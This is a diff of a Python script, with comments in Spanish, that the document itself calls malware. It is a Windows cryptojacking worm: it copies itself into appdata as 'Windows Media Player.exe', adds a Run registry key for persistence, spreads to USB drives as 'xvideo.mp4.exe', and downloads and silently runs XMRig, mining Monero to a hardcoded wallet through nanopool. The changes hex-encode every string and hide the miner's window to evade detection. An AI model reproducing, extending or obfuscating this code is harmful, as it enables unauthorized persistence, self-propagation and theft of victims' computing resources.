@@ -2,127 +2,186 @@ import os
 import shutil
 import sys
 import subprocess
-import threading
 import time
 from zipfile import ZipFile
-
 from getpass import getuser
 import platform
-import ctypes
 import urllib.request
 import wget
-import psutil
 import ssl
+import ctypes
 
+# =============================================
+# CONFIGURACIÓN DEBUG (CAMBIAR ESTE VALOR)
+# =============================================
+DEBUG = True  # Cambiar a False para desactivar logs
+
+# Función de decodificación hexadecimal
+def hx(s):
+    return bytes.fromhex(s).decode('utf-8')
+
+# Función de logging condicional
+def debug_log(message):
+    if DEBUG:
+        print(f"[DEBUG] {message}")
+
+# =============================================
+# CONFIGURACIÓN INICIAL
+# =============================================
 ssl._create_default_https_context = ssl._create_unverified_context
+debug_log("Configuración SSL completada")
 
-#64 o 32
 is_64bits = platform.machine().endswith('64')
+archi = is_64bits
+debug_log(f"Arquitectura de 64 bits: {archi}")
 
-if is_64bits:
-    archi=True
-else: 
-    archi=False
-
-
-# Obtener el nombre de usuario actual
 user = getuser()
-
-# Crear persistencia del malware en la máquina
-def create_persistence():
-
-    location = os.environ['appdata'] + '\\Windows Media Player.exe' 
-    if not os.path.exists(location):
-        shutil.copyfile(sys.executable, location)
-        subprocess.call(f'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v wmp /t REG_SZ /d "{location}"', shell=True)
-
-create_persistence()
-
-# Identificar el nombre de la máquina
 name = platform.node()
 system = platform.system()
 version = platform.version()
 fullname = f"{system}-{version}-{name}-{user}"
+debug_log(f"Sistema identificado: {fullname}")
 
-ruta_archivo = os.path.join("C:\\", "Users", user, "xmrig-6.18.0")
+# Configurar rutas importantes
+ruta_base = os.path.join(hx('433a5c5573657273'), user, hx('786d7269672d362e31382e30'))
+ruta_archivo = os.path.join(ruta_base)
+xmrig_path = os.path.join(ruta_base, hx('786d7269672e657865'))
+debug_log(f"Ruta XMRig: {xmrig_path}")
+
+# =============================================
+# FUNCIONES PRINCIPALES CON LOGGING
+# =============================================
+def create_persistence():
+    debug_log("Iniciando creación de persistencia...")
+    reg_path = hx('534f4654574152455c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c52756e')
+    exe_name = hx('57696e646f7773204d6564696120506c617965722e657865')
+    location = os.path.join(os.environ[hx('61707064617461')], exe_name)
+    
+    if not os.path.exists(location):
+        try:
+            shutil.copyfile(sys.executable, location)
+            debug_log(f"Archivo copiado a: {location}")
+            
+            subprocess.call(
+                f'reg add HKCU\\{reg_path} /v wmp /t REG_SZ /d "{location}"', 
+                shell=True
+            )
+            debug_log("Entrada de registro creada")
+        except Exception as e:
+            debug_log(f"Error en persistencia: {str(e)}")
+    else:
+        debug_log("Persistencia ya existe")
+
+create_persistence()
 
 def copy_malware_to_usb(usb_letter):
     usb_path = f"{usb_letter}:\\"
     if os.path.exists(usb_path):
-        malware_directory = os.path.join(usb_path, "xvideo")
-        if not os.path.exists(malware_directory):
-            os.makedirs(malware_directory)
-            shutil.copyfile(sys.executable, os.path.join(malware_directory, "xvideo.mp4.exe"))
+        dir_name = hx('78766964656f')
+        malware_directory = os.path.join(usb_path, dir_name)
+        try:
+            if not os.path.exists(malware_directory):
+                os.makedirs(malware_directory)
+                debug_log(f"Directorio creado en USB {usb_letter}: {malware_directory}")
+                
+                target_name = hx('78766964656f2e6d70342e657865')
+                shutil.copyfile(sys.executable, os.path.join(malware_directory, target_name))
+                debug_log(f"Archivo malicioso copiado a USB {usb_letter}")
+        except Exception as e:
+            debug_log(f"Error en USB {usb_letter}: {str(e)}")
 
-malware_dirs = ["A","B","E","F","G","H","I","J","K","L","M","N","R","S","T","U","V","W","X","Y","Z"]
-
+def get_removable_drives():
+    debug_log("Buscando dispositivos USB...")
+    drives = []
+    kernel32 = ctypes.windll.kernel32
+    for letter in hx('4142434445464748494a4b4c4d4e4f505152535455565758595a'):
+        drive_path = f"{letter}:\\"
+        if kernel32.GetDriveTypeW(drive_path) == 2:
+            drives.append(letter)
+    debug_log(f"Unidades USB detectadas: {drives}")
+    return drives
 
 def internet_check():
     try:
-        urllib.request.urlopen('https://www.google.com', timeout=1)
+        urllib.request.urlopen(hx('68747470733a2f2f7777772e676f6f676c652e636f6d'), timeout=5)
+        debug_log("Conexión a internet activa")
         return True
-    except:
+    except Exception:
+        debug_log("Sin conexión a internet")
         return False
 
 def install_xmrig_malware():
+    debug_log("Iniciando instalación XMRig...")
     try:
-        if internet_check():
+        if not internet_check():
+            return False
 
-            ruta_archivo = os.path.join("C:\\", "Users", user, "xmrig-6.18.0")
-            print(ruta_archivo)
+        if not os.path.exists(ruta_archivo):
+            os.chdir(os.path.join(hx('433a5c5573657273'), user))
+            zip_url = hx('68747470733a2f2f6769746875622e636f6d2f786d7269672f786d7269672f72656c65617365732f646f776e6c6f61642f76362e31382e302f786d7269672d362e31382e302d6763632d77696e36342e7a6970')
+            debug_log(f"Descargando XMRig desde: {zip_url}")
             
-            if not os.path.exists(ruta_archivo):
-                os.chdir(os.path.join("C:\\", "Users", user))
-                wget.download('https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-gcc-win64.zip')
-                with ZipFile("xmrig-6.18.0-gcc-win64.zip", 'r') as zip:
-                    zip.extractall()
-                os.remove("xmrig-6.18.0-gcc-win64.zip")
-                print("¡Carpeta xmrig instalada!")
-
-            else:
-                print("¡Ya estás infectado!")
+            wget.download(zip_url, bar=None)
+            debug_log("Descarga completada")
+            
+            with ZipFile(hx('786d7269672d362e31382e302d6763632d77696e36342e7a6970'), 'r') as zip_ref:
+                zip_ref.extractall()
+                debug_log("Archivos extraídos")
+            
+            os.remove(hx('786d7269672d362e31382e302d6763632d77696e36342e7a6970'))
+            debug_log("Instalación XMRig completada")
+            return True
         else:
-            print("No hay conexión a internet.")
+            debug_log("XMRig ya está instalado")
+            return True
+            
     except Exception as e:
-        print(f"Error: {str(e)}")
-
-
-
-# Ejecutar el proceso de minería si el malware está presente
-xmrig_path = os.path.join("C:\\Users", user, "xmrig-6.18.0", "xmrig.exe")
+        debug_log(f"Error instalación XMRig: {str(e)}")
+        return False
 
 def is_xmrig_running():
+    try:
+        debug_log("Verificando estado de XMRig...")
+        output = subprocess.check_output(hx('7461736b6c697374202f46492022494d4147454e414d4520657120786d7269672e65786522202f4e48'), 
+                                       shell=True, stderr=subprocess.DEVNULL)
+        
+        if hx('786d7269672e657865').encode() in output:
+            debug_log("XMRig ya está en ejecución")
+            return True
+        else:
+            if not os.path.exists(xmrig_path):
+                debug_log("XMRig no instalado")
+                return False
+                
+            pool = hx('786d722d75732d65617374312e6e616e6f706f6f6c2e6f72673a3134343333')
+            wallet = hx('34356555466146436d713453486569476a666b6e63665646654754414651745a634259316e62586d505a64636966634253614169374657413453796633636e56634848783936706e5862655673665a4d753159457544754136796d5a723650')
+            args = [xmrig_path, "-o", pool, "-u", f"{wallet}/{fullname}", "--tls", "--coin", "monero", "-B"]
+            
+            debug_log("Iniciando proceso XMRig...")
+            subprocess.Popen(args, creationflags=subprocess.CREATE_NO_WINDOW)
+            return True
+    except Exception as e:
+        debug_log(f"Error XMRig: {str(e)}")
+        return False
 
-    cmd = 'tasklist /FI "IMAGENAME eq xmrig.exe" /NH'
-    outpud = subprocess.check_output(cmd,shell=True)
-
-    if b'xmrig.exe' in outpud:
-        print("xmrig corre")
-    else: 
-        args = [
-        xmrig_path,
-        "-o", "xmr-us-east1.nanopool.org:14433",
-        "-u", f"45eUFaFCmq4SHeiGjfkncfVFeGTAFQtZcBY1nbXmPZdcifcBSaAi7FWA4Syf3cnVcHCx96pnXbeVsfZMu1YEuDuA6ymZr6P/{fullname}",
-        "--tls", "--coin", "monero", "-B"
-        ]
-        subprocess.Popen(args)
-        print("Corriendo xmrig")        
-
-def propague():
+def propagate():
+    debug_log("Iniciando ciclo de propagación...")
     while True:
-        internet_check()
-        install_xmrig_malware() 
+        try:
+            if archi and internet_check():
+                install_xmrig_malware()
+            
+            if os.path.exists(ruta_archivo) and archi:
+                is_xmrig_running()
+            
+            for usb_letter in get_removable_drives():
+                copy_malware_to_usb(usb_letter)
+            
+            debug_log("Ciclo completado - Esperando próximo...")
+            time.sleep(20)
+        except Exception as e:
+            debug_log(f"Error general: {str(e)}")
+            time.sleep(60)
 
-        if os.path.exists(ruta_archivo) and archi==True:
-            is_xmrig_running()
-
-        for usb_dir in malware_dirs:
-            copy_malware_to_usb(usb_dir)
-
-        time.sleep(20)
-        print("Propagando...")
-
-propague()
-
-
-
+if __name__ == "__main__":
+    propagate()
